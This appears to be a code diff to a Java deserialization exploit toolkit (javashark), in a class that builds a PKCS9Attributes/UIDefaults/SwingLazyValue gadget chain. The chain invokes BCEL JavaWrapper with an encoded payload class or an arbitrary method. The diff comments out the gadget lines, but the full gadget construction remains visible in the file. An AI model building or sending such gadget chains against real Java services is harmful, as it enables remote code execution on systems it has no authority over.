@@ -5,7 +5,7 @@ import dev.silente.javashark.utils.ReflectUtils;
 import dev.silente.javashark.utils.TestUtils;
 import sun.security.pkcs.PKCS9Attribute;
 import sun.security.pkcs.PKCS9Attributes;
-import sun.swing.SwingLazyValue;
+//import sun.swing.SwingLazyValue;
 
 import javax.swing.*;
 
@@ -19,7 +19,7 @@ public class GSwingLazyValue {
         PKCS9Attributes s = ReflectUtils.createWithoutConstructor(PKCS9Attributes.class);
         UIDefaults uiDefaults = new UIDefaults();
         String payload = SBCEL.getBCELCode(clz);
-        uiDefaults.put(PKCS9Attribute.EMAIL_ADDRESS_OID, new SwingLazyValue("com.sun.org.apache.bcel.internal.util.JavaWrapper", "_main", new Object[]{new String[]{payload}}));
+//        uiDefaults.put(PKCS9Attribute.EMAIL_ADDRESS_OID, new SwingLazyValue("com.sun.org.apache.bcel.internal.util.JavaWrapper", "_main", new Object[]{new String[]{payload}}));
         ReflectUtils.setFieldValue(s, "attributes", uiDefaults);
         return s;
     }
@@ -31,7 +31,7 @@ public class GSwingLazyValue {
          */
         PKCS9Attributes s = ReflectUtils.createWithoutConstructor(PKCS9Attributes.class);
         UIDefaults uiDefaults = new UIDefaults();
-        uiDefaults.put(PKCS9Attribute.EMAIL_ADDRESS_OID, new SwingLazyValue(className, methodName, params));
+//        uiDefaults.put(PKCS9Attribute.EMAIL_ADDRESS_OID, new SwingLazyValue(className, methodName, params));
         ReflectUtils.setFieldValue(s, "attributes", uiDefaults);
         return s;
     }
